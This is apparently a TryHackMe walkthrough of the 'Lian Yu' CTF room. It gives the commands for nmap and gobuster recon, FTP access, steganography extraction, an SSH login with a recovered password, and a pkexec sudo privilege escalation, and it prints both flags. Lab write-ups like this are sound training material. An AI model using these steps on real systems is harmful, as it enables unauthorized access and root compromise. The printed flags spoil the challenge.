# 🏝️ Lian Yu – TryHackMe Walkthrough

![Banner](https://i.imgur.com/your-banner-image.png)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Type](https://img.shields.io/badge/Type-CTF-blue)
![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20Steganography%20%7C%20PrivEsc-purple)

---

# 🧠 1. Reconnaissance

## 🔍 Nmap Scan

```bash
nmap -sC -sV -A 10.48.137.137
Result:
21/tcp → FTP (vsftpd 3.0.2)
22/tcp → SSH (OpenSSH 6.7p1)
80/tcp → HTTP (Apache - "Purgatory")
111/tcp → rpcbind
Analysis:
FTP likely entry point
Web server contains hidden directories
SSH is final access target
🌐 2. Web Enumeration
Gobuster Scan
gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Found:
/island
/server-status (403 Forbidden)
🌐 3. Deep Web Enumeration
Explore /island

Found hidden structure:

/island/2100
Hidden file discovered:
/green_arrow.ticket
📂 4. FTP Enumeration
Login
ftp 10.48.165.72

Username:

vigilante
Files found:
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user
Download files
mget *
🕵️ 5. Hidden File Analysis
Read hidden file
cat .other_user
Insight:

Story of Slade Wilson (Deathstroke) → hints username for SSH.

🧩 6. Steganography
Extract hidden file
steghide --extract -sf aa.jpg

Output:

ss.zip
Unzip file
unzip ss.zip
Files extracted:
passwd.txt
shado
Check password file
cat shado
Result:
M3tahuman
🔑 7. SSH Access
ssh slade@10.48.137.137

Password:

M3tahuman
👤 8. User Flag
cat user.txt
Flag:
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
⚙️ 9. Privilege Escalation
Check sudo rights
sudo -l
Output:
(root) PASSWD: /usr/bin/pkexec
Exploit
sudo -u root /usr/bin/pkexec /bin/bash
👑 10. Root Flag
cat root.txt
Flag:
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
🧾 Summary
Techniques Used:
Nmap scanning
Gobuster enumeration
FTP exploitation
Steganography extraction
Hidden file analysis
SSH login
Privilege escalation (pkexec abuse)
💬 Conclusion

This machine demonstrates the importance of:

Deep enumeration
Hidden file inspection
Steganography analysis
Privilege escalation misconfiguration

Every small clue leads to full system compromise.
